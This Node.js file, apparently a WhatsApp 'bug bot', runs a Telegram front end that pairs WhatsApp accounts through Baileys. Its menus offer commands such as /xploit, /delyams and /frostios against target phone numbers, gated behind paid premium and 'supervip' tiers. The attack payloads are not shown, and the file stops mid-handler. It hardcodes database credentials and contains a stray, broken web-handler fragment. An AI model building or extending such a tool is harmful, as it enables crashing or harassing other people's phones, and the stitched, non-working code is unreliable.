
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    COREWAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();
//SELAMAT DATANG 
// =========================
// DEPLOY BOT COMMAND 
// =========================



function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "✅" : "❌",
    supervip: isSupervip(userId) ? "✅" : "❌"
  };
}




const DB_USER = 'adminUser';
const DB_PASS = 'pass';
const DB_NAME = 'secureDB';
const DB_HOST = 'localhost';

const uri = `mongodb://${DB_USER}:${DB_PASS}@${DB_HOST}:27017/${DB_NAME}?authSource=admin`;



// Fungsi koneksi
async function connectDB() {
  try {
    await client.connect();
    return client.db(DB_NAME);
  } catch (err) {
    console.error('❌ MongoDB connection error:', err.message);
    process.exit(1);
  }
}

// Fungsi validasi input
function validateInput(input) {
  const pattern = /^[a-zA-Z0-9_@.-]+$/;
  if (!pattern.test(input)) throw new Error('Invalid input detected!');
  return input;
}


  try {
    
    const username = validateInput(req.body.username);
    const password = validateInput(req.body.password);
    
    res.redirect('/users');
  } catch (err) {
   
  }

  try {
    
    res.render('users', { users });
  } catch (err) {
    
  }




//JAKARTA 
function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}
///baca 

//function group only
bot.on('message', (msg) => {
  const chatType = msg.chat.type;
if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
    parse_mode: 'Markdown'
  });
}

});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<b><blockquote>#- C O N N E C T - 6 6 6</blockquote></b>
- 𝘚𝘵𝘢𝘵𝘶𝘴 : ⏳
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<b><blockquote>#- R E C O N N E C T - 6 6 6</blockquote></b>
- 𝘚𝘵𝘢𝘵𝘶𝘴 : ⏳
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<b><blockquote>#СОЕДИНЯТЬ ☎️</blockquote></b>
- 𝘚𝘵𝘢𝘵𝘶𝘴 : ⏳
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<b><blockquote>#- C O N N E C T E D - 6 6 6</blockquote></b>
- 𝘚𝘵𝘢𝘵𝘶𝘴 : ✅
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
<b><blockquote>#- P A I R I N G - C O D E</blockquote></b>
- 𝘊𝘰𝘥𝘦 : ${formattedCode}
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<b><blockquote>#- P A I R I N G - E R O R</blockquote></b>
- 𝘙𝘦𝘢𝘴𝘰𝘯 : ${error.message}
- 𝘉𝘰𝘵𝘴 : ${botNumber}
<b><i><blockquote>ТАК ЖЕ 👋</blockquote></i></b>
<b><i><blockquote>ЛИНУКС ЗДЕСЬ 👀</blockquote></i></b>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//definisi bot token dari file config.js
const { BOT_TOKEN } = require("./config.js");





// MENU COMMAND SECTION
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  //ganti link foto dan musik dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan
  const userId = msg.from.id;
  const { premium, supervip } = badge(userId);
  if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
      parse_mode: 'Markdown'
    });
  }
  await bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
    caption: `
<b><blockquote>𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔</blockquote></b>
<i>Author Linux here 👀 
❏ Version : 2.0.0
❏ Prefix : /
❏ SHOW MORE 🦴
❏ Run Time : ${runtime()}</i>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
      
      
      [
          { text: "𝐁𝐔𝐆 𝐌", callback_data: "bug_menu" },
          { text: "𝐎𝐖𝐍 𝐌𝐄𝐍𝐔", callback_data: "owner_menu" },
        ],
        [
        
        
           { text: "𝐀͢𝐥͡𝐥⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "all_menu" },
          { text: "CONTER", url: "https://t.me/Rezuly1" },
         
        ],
      ],
    },
  });
  await bot.sendAudio(chatId, 'https://files.catbox.moe/2qcx42.mp3', {
    title: "", 
    performer: "",
    caption: ""
  });
});

bot.on("callback_query", (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const { premium, supervip } = badge(userId);
  bot.answerCallbackQuery(callbackQuery.id);
    //ganti link foto dibawah sesuai kebutuhan
//ganti caption dibawah sesuai kebutuhan 
  if (data === "bug_menu") {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
        caption: `
<b><blockquote>𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔</blockquote></b>
<i>Author Linux here 👀 
❏ Version : 2.0.0
❏ Prefix : /
❏ SHOW MORE 🦴
❏ Run Time : ${runtime()}</i>

─▢ /xploit +628
─▢ /Quiksilver +628
─▢ /Douwes +628
─▢ /Chatms +628
─▢ /quote +628
<b><blockquote></blockquote></b>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "backmenu", callback_data: "start_menu" }]],
        },
      });
    });
  } else if (data === "owner_menu") {
   const message = callbackQuery.message;
   const userId = callbackQuery.from.id;
   const { premium, supervip } = badge(userId);
   if (message) {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
        caption: `
<b><blockquote>𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔</blockquote></b>
<i>Author Linux here 👀 
❏ Version : 2.0.0
❏ Prefix : /
❏ SHOW MORE 🦴
❏ Run Time : ${runtime()}</i>
<b><blockquote>#- 𝐎 𝐖 𝐍 𝐄 𝐑 𝐌 𝐄 𝐍 𝐔</blockquote></b>
─▢ /addprem  id day
─▢ /delprem  id
─▢ /addsvip  id
─▢ /delsvip  id
─▢ /listbot lis
─▢ /grouponly on|off
─▢ /setcd 5m
─▢ /addbot number 
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "backmenu", callback_data: "start_menu" }]],
        },
      });
    });
  }
  } else if (data === "all_menu") {
   const message = callbackQuery.message;
   const userId = callbackQuery.from.id;
   const { premium, supervip } = badge(userId);
   if (message) {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
        caption: `
<b><blockquote>「 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 ☇ 𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦📟  」</blockquote></b>
<b><blockquote>𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔</blockquote></b>
<i>Author Linux here 👀 
❏ Version : 2.0.0
❏ Prefix : /
❏ SHOW MORE 🦴
❏ Run Time : ${runtime()}</i>

͜(!)𝐀͢𝐋͡𝐋 ⍣ 𝐌͢𝐄͡𝐍͜𝐔〽️
# -𝐌͢𝐚͡𝐭͜𝐫͢𝐢͡𝐱 ⍣᳟ 𝐆͢𝐞͡𝐭͜𝐬𝐮͢𝐙͡𝐨͜𝐃͢𝐞͡𝐥𝐚𝐲
─▢ /xploit +628
─▢ /Quiksilver +628
─▢ /Douwes +628
─▢ /Chatms +628
─▢ /quote +628
─▢ /zanroto +628


# -༑𝐈͢𝐎͡𝐒𝐕͜𝐨͢𝐢͡𝐝༑
─▢ /delyams +628
─▢ /frostios +628
─▢ /does +628

# -𝐏͢𝐫͡𝐞͜𝐦͢𝐢͡𝐮͜𝐬 ⍣᳟ 𝐔͢𝐬͡𝐞͜𝐫𝐬𝐀͢𝐝͡𝐝
─▢ /addprem id day
─▢ /delprem id
─▢ /listprem listprem 

# -𝐀͢𝐝͡𝐦͜𝐢͢𝐧 ⍣᳟ 𝐔͢𝐬͡𝐞͜𝐫𝐬𝐀͢𝐝͡𝐝
─▢ /addsvip 
─▢ /delsvip 
─▢ listbot

# -𝐒͢𝐞͡𝐭͜𝐭͢𝐢͡𝐧͜𝐠𝐬 ⍣᳟ 𝐌͢𝐞͡𝐧͜𝐮
─▢ /setcd 5m
─▢ /gruponly on|off
─▢ /addbot number 

`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "backmenu", callback_data: "start_menu" }]],
        },
      });
    });
  }
  
 } else if (data === "start_menu") {
  const username = callbackQuery.from.username || "Unknown";
  const message = callbackQuery.message;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  const { premium, supervip } = badge(userId);
  if (message) {
    bot.deleteMessage(chatId, message.message_id).then(async () => {
      bot.sendVideo(chatId, "https://files.catbox.moe/bxk4qv.mp4", {
        caption: `
<b><blockquote>𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙͜𝐨 𝙄𝙉𝙁𝙄𝙉𝙄𝙏𝙔</blockquote></b>
<i>Author Linux here 👀 
❏ Version : 2.0.0
❏ Prefix : /
❏ SHOW MORE 🦴
❏ Run Time : ${runtime()}</i>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
    
        [
          { text:  "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "bug_menu" },
          { text: "𝐎𝐖𝐍 𝐌𝐄𝐍𝐔", callback_data: "owner_menu" },
        ],
        [
          { text: "𝐀͢𝐥͡𝐥⍣᳟𝐌͢𝐞͡𝐧͜𝐮꙳͙͡", callback_data: "all_menu" },
          { text: "CONTER", url: "https://t.me/Rezuly1" },
            ],
          ],
        },
      });

      await bot.sendAudio(chatId, 'https://files.catbox.moe/2qcx42.mp3', {
    title: "", 
    performer: "",
    caption: ""
        });
      });
    }
  }
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});
const supervipFile = path.resolve("./addadmin.js");
let supervipUsers = require("./addadmin.js");

function isSupervip(userId) {
  const user = supervipUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    supervipUsers = supervipUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(supervipFile, `const supervipUsers = ${JSON.stringify(supervipUsers, null, 2)};`);
    return false; 
  }
  return true; 
}

bot.onText(/\/addsvip(?:\s+(\d+))?\s+(\d+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA Broo?!* Hanya OWNER yang bisa menambahkan addadmin.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example: /addsvip <id> <durasi>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const durationDays = parseInt(match[2]);

  if (!newUserId || isNaN(durationDays) || durationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau durasi tidak valid.");
  }

  const expirationTime = Date.now() + durationDays * 24 * 60 * 60 * 1000; 

  if (supervipUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah terdaftar sebagai addadmin.");
  }

  supervipUsers.push({ id: newUserId, expiresAt: expirationTime });

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip dengan kedaluwarsa ${durationDays} hari.`
    );
  });
});

bot.onText(/\/delsvip(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa hapus addadmin.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delsvip <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");
  const userIndex = supervipUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan dalam daftar addadmin.");
  }
  supervipUsers.splice(userIndex, 1);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listsvip/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!*\nHanya OWNER yang bisa lihat daftar addadmin.",
      { parse_mode: "Markdown" }
    );
  }

  const validSupervipUsers = supervipUsers.filter(user => user.expiresAt > Date.now());

  if (!validSupervipUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar addadmin kosong.");
  }

  const svipList = validSupervipUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
`<blockquote><b>LIST SUPER VIP USER</b></blockquote>
<blockquote>${svipList}
</blockquote>
`,
    { parse_mode: "HTML" }
  );
});


const premiumFile = path.resolve("./welcome.js");
let premiumUsers = require("./welcome.js");

function isPremium(userId) {
  const user = premiumUsers.find(u => u.id === userId.toString());
  if (!user) return false;
  
  // Cek apakah waktu kedaluwarsa sudah lewat
  const currentTime = Date.now();
  if (user.expiresAt < currentTime) {
    // Hapus pengguna yang kedaluwarsa dari daftar
    premiumUsers = premiumUsers.filter(u => u.id !== userId.toString());
    fs.writeFileSync(premiumFile, `const premiumUsers = ${JSON.stringify(premiumUsers, null, 2)};`);
    return false;  
  }

  return true; 
}

bot.onText(/\/addprem(?:\s+(.+)\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* ONLY OWNER & addadmin !.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1] || !match[2]) {
    return bot.sendMessage(chatId, "❗Example : /addprem <id> <days>", {
      parse_mode: "Markdown",
    });
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");
  const expirationDays = parseInt(match[2]);

  if (!newUserId || isNaN(expirationDays) || expirationDays <= 0) {
    return bot.sendMessage(chatId, "❗ID atau waktu kedaluwarsa tidak valid.");
  }

  if (premiumUsers.some(user => user.id === newUserId)) {
    return bot.sendMessage(chatId, "❗User sudah premium.");
  }

  const expiresAt = Date.now() + expirationDays * 24 * 60 * 60 * 1000;

  premiumUsers.push({ id: newUserId, expiresAt });

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium dengan waktu kedaluwarsa ${expirationDays} hari.`
    );
  });
});

bot.onText(/\/delprem(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & addadmin yang bisa hapus premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗Example : /delprem <id>", {
      parse_mode: "Markdown",
    });
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  const userIndex = premiumUsers.findIndex(user => user.id === userIdToRemove);

  if (userIndex === -1) {
    return bot.sendMessage(chatId, "❗User tidak ditemukan di daftar premium.");
  }

  premiumUsers.splice(userIndex, 1);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "⚠️ Terjadi kesalahan saat menyimpan data premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!premiumUsers.length) {
    return bot.sendMessage(chatId, "📭 Daftar pengguna premium kosong.");
  }

  const premiumList = premiumUsers
    .map((user, index) => {
      const expiresAt = new Date(user.expiresAt).toLocaleString();
      return `${index + 1}. ${user.id}\nExpired : ${expiresAt}`;
    })
    .join("\n\n");

  bot.sendMessage(
    chatId,
`<blockquote><b>LIST PREMIUM USER</b></blockquote>
<blockquote>
${premiumList}
</blockquote>
`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA Brook?!.* ONLY OWNER & addadmin !.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Akses hanya untuk OWNER & addadmin
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA Oy?!* Hanya OWNER & addadmin yang bisa tambah bot.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/grouponly (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU ZAND BUKAN?!* Hanya OWNER yang bisa mengubah mode Group Only.", {
      parse_mode: "Markdown"
    });
  }

  const state = match[1].toLowerCase();
  settings.groupOnly = state === 'on';

  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Mode *Group Only* telah *${settings.groupOnly ? 'AKTIF' : 'NONAKTIF'}*.`, {
      parse_mode: 'Markdown'
    });
  } catch (error) {
    bot.sendMessage(chatId, "❌ Gagal menyimpan pengaturan.", {
      parse_mode: 'Markdown'
    });
    console.error("Gagal menulis settings.json:", error);
  }
});

bot.onText(/^\/grouponly$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  bot.sendMessage(chatId, '❗️Example: /grouponly on');
});

bot.onText(/^\/setcd (\d+)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❗*LU SIAPA GOBLOK?!* Hanya OWNER yang bisa mengubah cooldown.", {
      parse_mode: "Markdown"
    });
  }

  const newCd = parseInt(match[1]);
  if (isNaN(newCd) || newCd < 0) {
    return bot.sendMessage(chatId, '⚠️ Masukkan angka yang valid (>= 0).');
  }
  settings.cooldown = newCd;
  try {
    fs.writeFileSync('./settings.json', JSON.stringify(settings, null, 2));
    bot.sendMessage(chatId, `✅ Cooldown berhasil diubah menjadi *${newCd} detik*.`, {
      parse_mode: 'Markdown'
    });
  } catch (err) {
